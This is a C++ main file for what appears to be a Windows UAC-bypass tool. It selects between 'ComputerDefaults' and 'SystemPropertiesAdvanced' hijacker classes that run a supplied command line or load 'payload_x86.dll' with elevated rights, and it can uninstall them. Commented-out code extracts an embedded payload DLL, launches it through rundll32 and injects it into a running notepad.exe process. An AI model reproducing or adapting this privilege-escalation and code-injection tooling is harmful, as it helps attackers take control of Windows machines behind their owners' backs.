// Project1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"

//#define DLL_PAYLOAD_X86_PATH L"%USERPROFILE%\\Desktop\\Demo_PE\\payload_x86.dll"
//#define RUNDLL32_PATH L"%WinDir%\\system32\\rundll32.exe"
//#define DLL_PAYLOAD_ENTRY_POINT L"EntryPoint"
#define DLL_NAME_X86 L"payload_x86.dll"


#include <Shlwapi.h>
#pragma comment (lib, "Shlwapi")


int wmain(int argc, wchar_t* argv[])
{
	Wrapper::Init();

	if (argc < 3)
		return 1;

	// Method
	DWORD method = StrToIntW(argv[1]);
	if (method >= Method::MethodCount)
		return 1;

	// Mode
	bool bInstall = StrToIntW(argv[2]);

	// Commandline
	LPWSTR wzCommandLine = NULL;
	if (bInstall)
	{
		if (argc == 4)
			wzCommandLine = argv[3];
		else
			return 1;
	}
	

	
	/*
	 * ====================================================
	 */

	if (Method::ComputerDefaults == method)
	{
		ComputerDefaultsHijacker hijacker;

		if (bInstall)
		{
			hijacker.Install(wzCommandLine);
			hijacker.Run();
		}
		else
			hijacker.Uninstall();
	}
	if (Method::SystemPropertiesAdvanced == method)
	{
		SystemPropertiesAdvancedHijacker hijacker;

		if (bInstall)
		{
			WCHAR wzDllPath[MAX_PATH];
			GetCurrentDirectoryW(_countof(wzDllPath), wzDllPath);
			PathAppendW(wzDllPath, DLL_NAME_X86);
			
			hijacker.Install(wzDllPath, wzCommandLine);
			hijacker.Run();
		}
		else
			hijacker.Uninstall();
	}


	
	return 0;
	
	//LPBYTE pData = NULL;
	//DWORD dwDataSize = 0;
	//Wrapper::GetResourceData(IDR_PKW9JSDH1, L"PKw9jsdH", pData, dwDataSize);
	//
	//Wrapper::WriteToFile(DLL_PAYLOAD_X86_PATH, pData, dwDataSize, false);

	//WCHAR wzCommand[MAX_PATH] = {0};
	//StringCbCatW(wzCommand, sizeof(wzCommand), RUNDLL32_PATH);
	//StringCbCatW(wzCommand, sizeof(wzCommand), L" ");
	//StringCbCatW(wzCommand, sizeof(wzCommand), DLL_PAYLOAD_X86_PATH);
	//StringCbCatW(wzCommand, sizeof(wzCommand), L",");
	//StringCbCatW(wzCommand, sizeof(wzCommand), DLL_PAYLOAD_ENTRY_POINT);

	////Wrapper::Log(LOG_PATH);

	//if (0)
	//{
	//	DWORD aPids[100];
	//	DWORD dwPidCount = _countof(aPids);
	//	Wrapper::FindProcess(aPids, dwPidCount, L"notepad.exe", (MANDATORY_LEVEL)-1);

	//	ProcessInjecter injecter;
	//	injecter.Install(aPids[0], DLL_PAYLOAD_X86_PATH);
	//	injecter.Run();
	//	return 0;
	//}
	
	//return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
